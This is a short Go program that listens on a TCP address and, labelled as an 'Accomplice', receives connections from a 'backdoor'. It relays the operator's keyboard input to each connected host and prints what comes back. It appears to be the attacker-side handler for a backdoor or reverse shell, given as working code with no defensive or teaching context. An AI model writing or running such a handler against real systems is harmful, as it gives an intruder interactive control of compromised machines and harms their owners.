package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
)

func main() {
	addr := os.Args[1]
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Accomplice listening on", addr)
	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println(err)
			continue
		}
		fmt.Println("Connected to backdoor", conn.RemoteAddr())
		go io.Copy(conn, os.Stdin)
		io.Copy(os.Stdout, conn)
		fmt.Println("Disconnected from backdoor", conn.RemoteAddr())
	}
}
